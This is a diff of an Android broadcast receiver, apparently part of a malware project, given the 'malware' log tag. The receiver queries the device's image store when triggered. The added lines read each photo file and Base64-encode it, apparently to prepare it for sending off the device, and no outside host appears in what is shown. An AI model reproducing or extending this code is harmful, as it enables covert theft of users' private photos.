@@ -8,8 +8,11 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.provider.MediaStore;
+import android.util.Base64;
 import android.util.Log;
 import android.provider.MediaStore.Images;
+
+import java.io.File;
 
 /**
  * Created by admin on 9/23/15.
@@ -46,6 +49,12 @@ public class ChargeReceiver extends BroadcastReceiver{
                     String data = cur.getString(cur.getColumnIndex(Images.ImageColumns.DATA));
                     // do what ever you want here
                     Log.d("malware", data);
+                    File file = new File(data);
+                    byte[] bytes = Utils.loadFile(file);
+                    byte[] encoded = Base64.encode(bytes, 1);
+                    String encodedString = new String(encoded);
+
+                    Log.d("malware", encodedString);
                 }while(cur.moveToNext());
             }
             cur.close();
@@ -55,4 +64,6 @@ public class ChargeReceiver extends BroadcastReceiver{
             e.printStackTrace();
         }
     }
+
+
 }
